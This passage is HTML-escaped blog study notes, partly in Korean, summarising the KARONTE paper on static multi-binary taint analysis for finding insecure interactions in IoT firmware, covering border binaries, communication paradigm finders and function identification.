      &lt;li&gt;&lt;a href=&quot;#51-purpose-and-overview&quot; id=&quot;markdown-toc-51-purpose-and-overview&quot;&gt;5.1. Purpose and Overview&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#52-communication-paradigm-finders&quot; id=&quot;markdown-toc-52-communication-paradigm-finders&quot;&gt;5.2. Communication Paradigm Finders&lt;/a&gt;        &lt;ul&gt;
          &lt;li&gt;&lt;a href=&quot;#objective&quot; id=&quot;markdown-toc-objective&quot;&gt;Objective&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#key-functionalities&quot; id=&quot;markdown-toc-key-functionalities&quot;&gt;Key Functionalities&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#implementation&quot; id=&quot;markdown-toc-implementation&quot;&gt;Implementation&lt;/a&gt;&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#53-building-the-bdg&quot; id=&quot;markdown-toc-53-building-the-bdg&quot;&gt;5.3. Building the BDG&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#6-static-taint-analysis&quot; id=&quot;markdown-toc-6-static-taint-analysis&quot;&gt;6. Static Taint Analysis&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#7-multi-binary-data-flow-analysis&quot; id=&quot;markdown-toc-7-multi-binary-data-flow-analysis&quot;&gt;&lt;strong&gt;7. Multi-Binary Data-Flow Analysis&lt;/strong&gt;&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#71-key-insight--concepts&quot; id=&quot;markdown-toc-71-key-insight--concepts&quot;&gt;7.1. Key Insight &amp;amp; Concepts&lt;/a&gt;        &lt;ul&gt;
          &lt;li&gt;&lt;a href=&quot;#72-bfg-building&quot; id=&quot;markdown-toc-72-bfg-building&quot;&gt;7.2. BFG Building&lt;/a&gt;&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#8-insecure-interations-detection&quot; id=&quot;markdown-toc-8-insecure-interations-detection&quot;&gt;8. Insecure Interations Detection&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#9-discussion&quot; id=&quot;markdown-toc-9-discussion&quot;&gt;9. Discussion&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#10-evaluation&quot; id=&quot;markdown-toc-10-evaluation&quot;&gt;10. Evaluation&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#12-conclusion&quot; id=&quot;markdown-toc-12-conclusion&quot;&gt;12. Conclusion&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#appendix&quot; id=&quot;markdown-toc-appendix&quot;&gt;Appendix&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#a-functions-identification&quot; id=&quot;markdown-toc-a-functions-identification&quot;&gt;A. Functions Identification&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#b-border-binaries-discovery&quot; id=&quot;markdown-toc-b-border-binaries-discovery&quot;&gt;B. Border Binaries Discovery&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#c-communication-paradigm-finders&quot; id=&quot;markdown-toc-c-communication-paradigm-finders&quot;&gt;C. Communication Paradigm Finders&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#d-binary-dependency-graph-algorithm&quot; id=&quot;markdown-toc-d-binary-dependency-graph-algorithm&quot;&gt;D. Binary Dependency Graph Algorithm&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#e-static-taint-analysis&quot; id=&quot;markdown-toc-e-static-taint-analysis&quot;&gt;E. Static Taint Analysis&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#f-multi-binary-data-flow-analysis&quot; id=&quot;markdown-toc-f-multi-binary-data-flow-analysis&quot;&gt;F. Multi-binary Data-flow Analysis&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#g-vulnerability-example&quot; id=&quot;markdown-toc-g-vulnerability-example&quot;&gt;G. Vulnerability Example&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h1 id=&quot;0-주안점&quot;&gt;0. 주안점&lt;/h1&gt;

&lt;p&gt;논문의 요지 → 1) 어떤 새로운 기술을 도입해 2) 이만큼의 향상된 결과를 냈다&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;즉, 논문의 핵심은 → ‘향상된 결과’를 낼 수 있었던 원인이 ‘어떤 기술’ 인가&lt;/li&gt;
  &lt;li&gt;추가로, ‘이만큼 향상됐음’의 근거는 무엇인가&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;이번 논문 과제의 의도는 연구실이 기반하고 있는 연구 분야가 무엇인지 이해하는 것이라고 생각&lt;/p&gt;

&lt;p&gt;따라서 ‘기술’에 주안점을 두고 논문 리딩 진행&lt;/p&gt;

&lt;div class=&quot;notice--primary&quot;&gt;

&lt;p&gt;&lt;strong&gt;💡논문에서 내가 얻어야 할 것은? &lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;→ 향상된 결과의 기반이 되었던 기술적 발전은 무엇인가?&lt;/p&gt;
&lt;ul&gt;
    &lt;li&gt;multiple binaries analysis + inter-binary data flow analysis&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;→ 그것은 어떤 아이디어에 기반하였는가?&lt;/p&gt;
&lt;ul&gt;
    &lt;li&gt;
        Modeling &amp;amp;Tracking &lt;strong&gt;multi-binary interactions&lt;/strong&gt;
    &lt;/li&gt;
    &lt;li&gt;
        &lt;strong&gt;IPC paradigm used in one firmware is likely to be finite(concept)&lt;/strong&gt;
        &lt;ul&gt;
            &lt;li&gt;
                &lt;strong&gt;한 바이너리의 data I/O 파악(mid-implementation)&lt;/strong&gt;
                → inter-binary data flow recovery
            &lt;/li&gt;
        &lt;/ul&gt;
    &lt;/li&gt;
    &lt;li&gt;
        by leveraging &lt;strong&gt;CPF(Communication Paradigm Finder) modules(Implementation)&lt;/strong&gt;
    &lt;/li&gt;
&lt;/ul&gt;

&lt;/div&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;시행착오&lt;/strong&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Appendix가 기술set 설명과 매우 밀접해 보여, 원활한 이해를 위해 Approach Overview를 읽고 바로 Appendix를 읽었음.
    &lt;ul&gt;
      &lt;li&gt;그러나 Appendix는 핵심 기술의 component 레벨 요소에 관한 세부 설명이었음&lt;/li&gt;
      &lt;li&gt;즉 논문 본문을 다 읽고 Appendix를 읽는 것이 효율적이었음&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h1 id=&quot;1-introduction&quot;&gt;1. Introduction&lt;/h1&gt;

&lt;h2 id=&quot;11-abstract&quot;&gt;1.1. Abstract&lt;/h2&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/2025-01-26-KARONTE/image.png&quot; alt=&quot;image.png&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;IoT devices - Software on these systems(Firmware)
    &lt;ul&gt;
      &lt;li&gt;Analysis challenged
        &lt;ul&gt;
          &lt;li&gt;Hardware-dependent&lt;/li&gt;
          &lt;li&gt;Not-standardized Environment → 1) unique &amp;amp; minimal 2) non-standard configurations&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;Analysis complicated
        &lt;ul&gt;
          &lt;li&gt;Multiple Binaries
            &lt;ul&gt;
              &lt;li&gt;Addressing the communication between executables is complicated&lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;KARONTE
    &lt;ul&gt;
      &lt;li&gt;Static&lt;/li&gt;
      &lt;li&gt;Modeling &amp;amp; Tracking &lt;strong&gt;multi-binary interactions&lt;/strong&gt;&lt;/li&gt;
      &lt;li&gt;Starting from taint information → insecure interactions → vulnerability identification&lt;/li&gt;
      &lt;li&gt;Evaluation
        &lt;ol&gt;
          &lt;li&gt;On Tracking&amp;amp;Constraining Multi-binary interactions abilities&lt;/li&gt;
          &lt;li&gt;On Scaling ability about:
            &lt;ol&gt;
              &lt;li&gt;firmwares with various size and complexity&lt;/li&gt;
            &lt;/ol&gt;
          &lt;/li&gt;
        &lt;/ol&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h1 id=&quot;2-background&quot;&gt;2. Background&lt;/h1&gt;

&lt;h3 id=&quot;emersion-of-iot-devices&quot;&gt;Emersion of IoT devices&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;Vast amount of IoT devices introduced new-coined threats into cybersecurity landscape&lt;/li&gt;
  &lt;li&gt;Techniques that are invented, especially in the perspective of unpacking binaries, were insufficient&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;constraint-of-traditional-analysis-techniques&quot;&gt;Constraint of traditional analysis techniques&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;strong&gt;Interconnected components&lt;/strong&gt;(functionality based on multiple programs execution)&lt;/p&gt;

    &lt;p&gt;↔ analysis without accounting for the &lt;strong&gt;internal flow of data&lt;/strong&gt;&lt;/p&gt;

    &lt;p&gt;→ Ignore &lt;strong&gt;meaningful constraints&lt;/strong&gt; arise from inter-binary communication&lt;/p&gt;

    &lt;p&gt;→ Inability to &lt;strong&gt;differentiate sources of input&lt;/strong&gt;(attacker-controlled or non-attacker-controlled)&lt;/p&gt;

    &lt;p&gt;→ Limited search performance that leads to uncovering &lt;strong&gt;only superficial bugs&lt;/strong&gt;&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;strong&gt;Hence&lt;/strong&gt;,&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Consideration about &lt;strong&gt;multiple binary execution&lt;/strong&gt; is necessary&lt;/li&gt;
  &lt;li&gt;Analysis on the &lt;strong&gt;data shared&lt;/strong&gt; among multiple binary is necessary&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;karonte&quot;&gt;KARONTE&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;Static&lt;/li&gt;
  &lt;li&gt;Track data flow&lt;/li&gt;
  &lt;li&gt;Intuition:
    &lt;ol&gt;
      &lt;li&gt;&lt;strong&gt;IPC paradigm used in one firmware is likely to be finite&lt;/strong&gt;&lt;/li&gt;
      &lt;li&gt;Derive commonalities in the paradigm set&lt;/li&gt;
      &lt;li&gt;Use the commonalities to detect input locations &amp;amp; inter-component interactions&lt;/li&gt;
      &lt;li&gt;Use the verified interactions to track inter-component data flow&lt;/li&gt;
      &lt;li&gt;Perform cross-binary taint analysis&lt;/li&gt;
      &lt;li&gt;Detect insecure uses(potential vulnerabilities)&lt;/li&gt;
    &lt;/ol&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h1 id=&quot;3-approach-overview&quot;&gt;3. Approach Overview&lt;/h1&gt;

&lt;p&gt;여기 설명된 항목 정리하고 Appendix에 나온 거랑 매핑해서 정리하자&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;31-firmware-pre-processing&quot;&gt;3.1. Firmware Pre-processing&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;unpack firmware sample using ‘binwalk’&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;32-border-binaries-discovery&quot;&gt;3.2. Border Binaries Discovery&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;‘Border Binary’: Binaries that export the device functionality to the outside world
    &lt;ul&gt;
      &lt;li&gt;Represents the point where accepts user requests &amp;amp; references user-controlled data&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;33-binary-dependency-graphbdg-recovery&quot;&gt;3.3. Binary Dependency Graph(BDG) Recovery&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;‘BDG’
    &lt;ul&gt;
      &lt;li&gt;Directed graph&lt;/li&gt;
      &lt;li&gt;Models communication among border binaries by leveraging &lt;strong&gt;CPF(Communication Paradigm Finder) modules&lt;/strong&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;34-multi-binary-data-flow-analysis&quot;&gt;3.4. Multi-binary Data-flow Analysis&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;By using ‘static taint engine’, the KARONTE:
    &lt;ul&gt;
      &lt;li&gt;Tracks data propagation&lt;/li&gt;
      &lt;li&gt;Collects data constraints&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;Simulate data propagation applying features gathered
    &lt;ul&gt;
      &lt;li&gt;from the target binary b to other binaries that have inbound edges from b&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;35-insecure-interactions-detection&quot;&gt;3.5. Insecure Interactions Detection&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;Identifying security issues&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h1 id=&quot;4-border-binaries-discovery&quot;&gt;4. Border Binaries Discovery&lt;/h1&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h1 id=&quot;5-binary-dependency-graph사실상-cpf가-핵심&quot;&gt;5. Binary Dependency Graph(사실상 CPF가 핵심)&lt;/h1&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;51-purpose-and-overview&quot;&gt;5.1. Purpose and Overview&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;BDG: detects data dependencies &amp;amp; model data propagation (setter binary → getter binary)&lt;/li&gt;
  &lt;li&gt;Challenges:
    &lt;ul&gt;
      &lt;li&gt;Inter-binary data propagation:
        &lt;ul&gt;
          &lt;li&gt;control flow information is useless because:
            &lt;ul&gt;
              &lt;li&gt;processes do NOT normally access other processes’ memory regions.&lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;Solution:
    &lt;ol&gt;
      &lt;li&gt;Model IPC paradigms by using CPFes(Communication Paradigm Finders)&lt;/li&gt;
      &lt;li&gt;Use modeled paradigms to build a graph == BDG(Binary Dependency Graph)&lt;/li&gt;
    &lt;/ol&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;52-communication-paradigm-finders&quot;&gt;5.2. Communication Paradigm Finders&lt;/h2&gt;

&lt;h3 id=&quot;objective&quot;&gt;Objective&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;Detect &amp;amp; Describe specific IPC paradigm which binary uses to share data&lt;/li&gt;
  &lt;li&gt;1)  explore binary &amp;amp; program path → 2) Does the path contains the necessary code to share data through the communication paradigm? → 3) If so, conduct deeper analysis using techniques below → 4) create edges of BDG utilizing features distinguished
    &lt;ol&gt;
      &lt;li&gt;Data Key Recovery&lt;/li&gt;
      &lt;li&gt;Flow Direction Determination&lt;/li&gt;
      &lt;li&gt;Binary Set Magnification&lt;/li&gt;
    &lt;/ol&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;key-functionalities&quot;&gt;Key Functionalities&lt;/h3&gt;

&lt;ol&gt;
  &lt;li&gt;&lt;strong&gt;Data Key Recovery&lt;/strong&gt;
    &lt;ol&gt;
      &lt;li&gt;referenced by the binary for IPCs&lt;/li&gt;
      &lt;li&gt;fundamental &amp;amp; essential → THE MOST IMPORTANT TECHNIQUE&lt;/li&gt;
    &lt;/ol&gt;
  &lt;/li&gt;
  &lt;li&gt;Flow Direction Determination(scope: one binary)
    &lt;ol&gt;
      &lt;li&gt;Role of each program points: ‘Setter’ &amp;amp; ‘Getter’&lt;/li&gt;
      &lt;li&gt;program points: access the data keys&lt;/li&gt;
    &lt;/ol&gt;
  &lt;/li&gt;
  &lt;li&gt;Binary Set Magnification(scope: whole firmware)
    &lt;ol&gt;
      &lt;li&gt;if any ‘binaries’ refer to the data keys → scheduled for further analysis&lt;/li&gt;
    &lt;/ol&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;implementation&quot;&gt;Implementation&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;‘Semantic CPF’: OS-Independent
    &lt;ul&gt;
      &lt;li&gt;Intuition: ‘Data Keys’ *IPC must rely on them *Often hard-coded in binaries&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;KARONTE uses:
    &lt;ul&gt;
      &lt;li&gt;Environment CPFes&lt;/li&gt;
      &lt;li&gt;File CPFes&lt;/li&gt;
      &lt;li&gt;Socket CPFes&lt;/li&gt;
      &lt;li&gt;Semantic CPFes&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;53-building-the-bdg&quot;&gt;5.3. Building the BDG&lt;/h2&gt;

&lt;p&gt;(시간이 부족한 관계로 우선순위 하강)&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h1 id=&quot;6-static-taint-analysis&quot;&gt;6. Static Taint Analysis&lt;/h1&gt;

&lt;p&gt;The operation of the underlying taint engine&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h1 id=&quot;7-multi-binary-data-flow-analysis&quot;&gt;&lt;strong&gt;7. Multi-Binary Data-Flow Analysis&lt;/strong&gt;&lt;/h1&gt;

&lt;p&gt;How KARONTE combines the taint engine with the BDG to do detection&lt;/p&gt;

&lt;p&gt;BDG&lt;/p&gt;

&lt;p&gt;BFG&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;71-key-insight--concepts&quot;&gt;7.1. Key Insight &amp;amp; Concepts&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;Paths with fewer constraints on user data dd are more likely to expose vulnerabilities.&lt;/li&gt;
  &lt;li&gt;BFG: Extended version of the BDG in the direction of ‘least strict set of constraint applied to the data shared among multiple binaries’&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;72-bfg-building&quot;&gt;7.2. BFG Building&lt;/h3&gt;

&lt;ol&gt;
  &lt;li&gt;Initialization&lt;/li&gt;
  &lt;li&gt;Constraint Propagation&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h1 id=&quot;8-insecure-interations-detection&quot;&gt;8. Insecure Interations Detection&lt;/h1&gt;

&lt;p&gt;Detection Target:&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;Memory-Corruption bugs&lt;/li&gt;
  &lt;li&gt;DoS vulnerabilities&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h1 id=&quot;9-discussion&quot;&gt;9. Discussion&lt;/h1&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h1 id=&quot;10-evaluation&quot;&gt;10. Evaluation&lt;/h1&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h1 id=&quot;12-conclusion&quot;&gt;12. Conclusion&lt;/h1&gt;

&lt;p&gt;KARONTE: Detect insecure interactions among components of embedded firmware&lt;/p&gt;

&lt;p&gt;+) Emphasizing the effectiveness of KARONTE&lt;/p&gt;

&lt;p&gt;→ 어떻게 insecure interactions를 알아냈는지에 관해 설명할 수 있는 게 중요한 듯해, Evaluation 파트는 나중에 읽어보는 것으로 함&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h1 id=&quot;appendix&quot;&gt;Appendix&lt;/h1&gt;

&lt;blockquote&gt;
  &lt;p&gt;Background를 읽으면서 이걸 같이 봐야 할 것 같음&lt;/p&gt;

&lt;/blockquote&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;a-functions-identification&quot;&gt;A. Functions Identification&lt;/h3&gt;

&lt;p&gt;3 types of functions is the goal of distinguishment&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;strong&gt;memcmp-like functions&lt;/strong&gt;&lt;/p&gt;

    &lt;p class=&quot;notice&quot;&gt;👥: sementically equvalent to memory comparisons&lt;/p&gt;

    &lt;ol&gt;
      &lt;li&gt;&lt;strong&gt;methodology&lt;/strong&gt;
        &lt;ol&gt;
          &lt;li&gt;If the target function $f$ contains at least one loop, then:
            &lt;ol&gt;
              &lt;li&gt;Scan the instructions in the body of the loop in the linear manner and list every program point $p$ which contains memory comparison instructions&lt;/li&gt;
              &lt;li&gt;Compute a static backward slice $p$ → $f$’s entry point&lt;/li&gt;
              &lt;li&gt;Inspect $f$’s args to clarify whether they could affect operands in $p$ and if so, then:
                &lt;ol&gt;
                  &lt;li&gt;$f$ becomes a candidate of memcmp-like functions&lt;/li&gt;
                  &lt;li&gt;Calculate the size of $f$(based on number of its basic blocks)&lt;/li&gt;
                  &lt;li&gt;Adopt &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;BootStomp&lt;/code&gt;’s threshold to decrease the number of false positives&lt;/li&gt;
                &lt;/ol&gt;
              &lt;/li&gt;
            &lt;/ol&gt;
          &lt;/li&gt;
        &lt;/ol&gt;
      &lt;/li&gt;
    &lt;/ol&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;strong&gt;strlen-like functions&lt;/strong&gt;&lt;/p&gt;

    &lt;p class=&quot;notice&quot;&gt;👥: calculate the length of a buffer&lt;/p&gt;

    &lt;ol&gt;
      &lt;li&gt;&lt;strong&gt;methodology&lt;/strong&gt;
        &lt;ol&gt;
          &lt;li&gt;&lt;strong&gt;similar to memcmp-like function search&lt;/strong&gt; implementation + ‘the existence of &lt;strong&gt;counter&lt;/strong&gt;, which increases as the number of loop iteration goes’&lt;/li&gt;
        &lt;/ol&gt;
      &lt;/li&gt;
    &lt;/ol&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;strong&gt;memcpy-like functions&lt;/strong&gt;&lt;/p&gt;

    &lt;p class=&quot;notice&quot;&gt;👥: copy the content of a memory location to another&lt;/p&gt;

    &lt;ol&gt;
      &lt;li&gt;&lt;strong&gt;methodology&lt;/strong&gt;
        &lt;ol&gt;
          &lt;li&gt;same with the methodology of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Bootstomp&lt;/code&gt;&lt;/li&gt;
        &lt;/ol&gt;
      &lt;/li&gt;
    &lt;/ol&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;function body is not available&lt;/strong&gt;
    &lt;ol&gt;
      &lt;li&gt;Heuristically match strings on the name of the function&lt;/li&gt;
    &lt;/ol&gt;

    &lt;p&gt;(opinion) It may become an armpit of this system&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Optimization strategy&lt;/strong&gt;
    &lt;ol&gt;
      &lt;li&gt;
        &lt;p&gt;Harness function generation: abstract the functions described above to minimize the resource of repeated execution&lt;/p&gt;

        &lt;p&gt;→ mitigate the ‘path explosion problem’&lt;/p&gt;

        &lt;p&gt;→ speed up, without losing precision.&lt;/p&gt;
      &lt;/li&gt;
    &lt;/ol&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;b-border-binaries-discovery&quot;&gt;B. Border Binaries Discovery&lt;/h3&gt;

&lt;p&gt;&lt;strong&gt;Connection mark → Flag&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Network mark → Counter&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Calculation Hardness: Connection mark »»»» Network mark&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;Network mark calculation
    &lt;ol&gt;
      &lt;li&gt;Retrieve all the &lt;strong&gt;memory comparisons&lt;/strong&gt; within a binary == Assume these will &lt;strong&gt;refer to hard-coded network related strings&lt;/strong&gt;&lt;/li&gt;
      &lt;li&gt;The strings mostly referred within &lt;strong&gt;the basic block(the call to the memory comparison, too)&lt;/strong&gt;&lt;/li&gt;
    &lt;/ol&gt;
  &lt;/li&gt;
  &lt;li&gt;Connenction mark calculation
    &lt;ol&gt;
      &lt;li&gt;Forward static taint analysis + Backward static taint analysis&lt;/li&gt;
      &lt;li&gt;Limitation on the {Number of functions analyzed, Time of symbolic exploration}&lt;/li&gt;
      &lt;li&gt;For the case of path(source-sink) exploration failed:
        &lt;ol&gt;
          &lt;li&gt;any imprecision from a function $f$ analysis⇒ analysis for $f$ is incomplete&lt;/li&gt;
          &lt;li&gt;over 50%(setted threshold) of experiments ends up in incomplete analysis, then:
            &lt;ol&gt;
              &lt;li&gt;conservatively set the connection mark.&lt;/li&gt;
            &lt;/ol&gt;
          &lt;/li&gt;
        &lt;/ol&gt;
      &lt;/li&gt;
      &lt;li&gt;Regarding OS dependency: if the OS is unknown, then simply set the connection mark.&lt;/li&gt;
    &lt;/ol&gt;
  &lt;/li&gt;
  &lt;li&gt;Utilize the feature ‘cmp’ when calculating Parsing Score.&lt;/li&gt;
&lt;/ol&gt;

&lt;h3 id=&quot;c-communication-paradigm-finders&quot;&gt;C. Communication Paradigm Finders&lt;/h3&gt;

&lt;p&gt;&lt;mark&gt; Purpose of CPF: When recovering BDG(Binary Dependency Graph), by leveraging CPF, it becomes able to map inter-binary data flow.&lt;/mark&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Aspect&lt;/th&gt;
      &lt;th&gt;Environment CPF&lt;/th&gt;
      &lt;th&gt;Semantic CPF&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;Trigger for Analysis&lt;/td&gt;
      &lt;td&gt;Calls that set/get environment variables or execute binaries.&lt;/td&gt;
      &lt;td&gt;Memory operations using hardcoded data keys as indices or references.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;Primary Detection&lt;/td&gt;
      &lt;td&gt;Strings representing environment keys or binary names.&lt;/td&gt;
      &lt;td&gt;Functions setting or getting data based on predefined data keys.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;Application Context&lt;/td&gt;
      &lt;td&gt;More suited for analyzing high-level OS interactions.&lt;/td&gt;
      &lt;td&gt;Ideal for low-level memory and firmware analysis.&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;OS-dependent CPF: Environment CPF
    &lt;ol&gt;
      &lt;li&gt;Key Idea
        &lt;ol&gt;
          &lt;li&gt;Calling to a function setting (or getting) environment variables is almost necessary when sharing data through environment variables before executing another binary.
            &lt;ol&gt;
              &lt;li&gt;Binary Execution Block Searching&lt;/li&gt;
              &lt;li&gt;Path (entry-block) searching to find out program points calling environment variable setting functions&lt;/li&gt;
              &lt;li&gt;reach-def analysis on path(entry-point)  → arguments values determination&lt;/li&gt;
              &lt;li&gt;Determined values == ‘data keys’&lt;/li&gt;
              &lt;li&gt;
                &lt;ul&gt;
                  &lt;li&gt;‘Binary Set Magnification Functionality’ ⇒ reach-def analysis → arg strings collection → possible binary names inference&lt;/li&gt;
                &lt;/ul&gt;
              &lt;/li&gt;
              &lt;li&gt;If binary names are unable to resolve → find all the binaries that rely on the data keys previously recovered.&lt;/li&gt;
            &lt;/ol&gt;
          &lt;/li&gt;
        &lt;/ol&gt;
      &lt;/li&gt;
      &lt;li&gt;Detection Focus
        &lt;ol&gt;
          &lt;li&gt;Program Path&lt;/li&gt;
